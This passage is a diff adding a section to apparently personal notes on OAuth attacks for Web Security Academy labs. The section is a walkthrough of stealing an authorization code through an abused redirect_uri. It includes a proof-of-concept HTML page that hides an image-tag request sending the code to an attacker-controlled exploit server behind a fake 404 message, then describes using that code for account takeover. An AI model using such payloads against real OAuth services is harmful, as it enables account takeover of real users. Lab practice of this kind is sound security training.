@@ -177,3 +177,39 @@ The URL you are requesting is no longer available
 ```
 
 -------------
+
+### Exploiting Oauth with CSRF via abused redirect_uri in authorization grant
+
+-------------
+
+- Exploit poc-:
+
+```html
+<meta name="referrer" content="never">
+<img src="https://oauth-0ad400090399b87580db6aeb02940025.oauth-server.net/auth?client_id=qpomemlmp082nnh8dl250&redirect_uri=https://exploit-0a4e004a036ab83580b66be9011a007a.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email" style="display:none" />
+<h1>404 - Page not found</h1>
+The URL you are requesting is no longer available
+```
+
+-  Change the `redirect_uri` to your the server you have control over-:
+
+```
+redirect_uri=https://exploit-0a4e004a036ab83580b66be9011a007a.exploit-server.net/oauth-callback
+```
+
+-  You should receive a callback on your server.
+
+<img width="852" height="147" alt="image" src="https://github.com/user-attachments/assets/7379b1e5-4c38-4303-998c-d9d303420119" />
+
+- Now, visit the link, it will be a walkover because `state` or `nonce` as not provided in the authorization grant.Don't forget that the `reponse_type` for `authorization code grant` is `code` and `token` for `implicit grant`.
+
+```url
+https://0ac0002f037eb89f809f6ce700ce00d4.web-security-academy.net/oauth-callback?code=[code]&response_type=code
+```
+
+- Access token grant access and account takeover.
+
+<img width="1293" height="407" alt="image" src="https://github.com/user-attachments/assets/30a7b8b1-0a6d-40ec-b999-ac0803710d7a" />
+
+--------------
+
